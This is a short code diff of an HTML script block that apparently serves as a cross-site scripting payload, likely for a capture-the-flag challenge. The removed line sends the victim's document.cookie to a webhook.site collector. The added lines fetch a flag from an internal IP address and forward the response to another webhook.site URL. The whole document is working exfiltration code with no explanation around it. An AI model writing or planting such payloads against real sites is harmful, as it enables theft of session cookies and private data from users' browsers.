@@ -1,5 +1,7 @@
 <script>
-    fetch(`https://webhook.site/2bacd992-6ab3-48ca-a8a7-501dfe6dcb1d/?flag=${document.cookie}`)
+    fetch(`http://51.120.3.165/flag`).then(response => response.text()).then(data => {
+        fetch(`https://webhook.site/bab544ec-ab97-4f19-a87c-18afab171a00/?flag=${data}`);
+    });
 </script>
 
 <!-- <script>
